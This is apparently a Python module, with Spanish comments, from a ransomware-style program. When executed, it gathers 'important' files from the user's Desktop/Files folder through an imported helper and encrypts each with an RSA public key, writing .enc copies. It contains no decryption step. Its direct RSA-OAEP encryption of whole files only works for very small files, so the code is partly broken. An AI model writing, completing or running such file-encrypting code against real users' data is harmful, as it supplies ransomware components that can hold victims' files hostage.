import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from find_files import recorrer_directorio 

#aquí debemos cifrar y descifrar los archivos y la clave púclica y simétrica 
# Ruta de la clave pública
RUTA_CLAVE_PUBLICA = "rsa_public.pem"

def cargar_clave_publica(ruta_clave_publica):
    """Carga la clave pública RSA desde un archivo .pem."""
    with open(ruta_clave_publica, "rb") as archivo:
        return RSA.import_key(archivo.read())

def cifrar_datos(datos, clave_publica):
    """Cifra los datos usando RSA y el esquema PKCS1_OAEP."""
    cipher_rsa = PKCS1_OAEP.new(clave_publica)
    return cipher_rsa.encrypt(datos)

def cifrar_archivo(ruta_archivo, clave_publica):
    """Cifra un archivo y guarda la versión cifrada."""
    with open(ruta_archivo, "rb") as archivo:
        datos = archivo.read()
    
    datos_cifrados = cifrar_datos(datos, clave_publica)
    
    with open(ruta_archivo + ".enc", "wb") as archivo_cifrado:
        archivo_cifrado.write(datos_cifrados)

def recorrer_y_cifrar():
    """Ejecuta recorrer_directorio() para obtener archivos y los cifra."""
    archivos_importantes = recorrer_directorio()  # Llama a la función que lista los archivos

    if not archivos_importantes:
        print("No se encontraron archivos para cifrar.")
        return

    clave_publica = cargar_clave_publica(RUTA_CLAVE_PUBLICA)

    for archivo in archivos_importantes:
        ruta_archivo = os.path.join(os.path.expanduser("~"), "Desktop", "Files", archivo)  
        print(f"Cifrando: {ruta_archivo}")
        cifrar_archivo(ruta_archivo, clave_publica)

# Ejecutar el cifrado
recorrer_y_cifrar()